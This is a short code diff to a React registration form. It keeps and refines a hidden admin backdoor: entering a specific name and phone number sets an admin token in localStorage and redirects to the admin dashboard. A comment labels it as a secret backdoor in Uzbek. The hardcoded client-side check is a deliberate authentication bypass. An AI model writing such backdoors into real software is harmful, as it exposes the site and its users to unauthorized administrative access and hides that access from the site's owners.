@@ -33,7 +33,11 @@ export default function Registration() {
     setLoading(true);
     
     // YASHIRIN ADMIN PANELGA KIRISH (BACKDOOR)
-    if (formData.firstName.trim().toLowerCase() === 'islombek' && formData.phone.trim() === '+998941322332') {
+    if (
+      formData.firstName.trim().toLowerCase() === 'islombek' && 
+      formData.lastName.trim().toLowerCase() === 'hakimov' && 
+      formData.phone.trim() === '+998941322332'
+    ) {
       localStorage.setItem('admin_token', 'mock_token');
       navigate('/admin/dashboard');
       return;
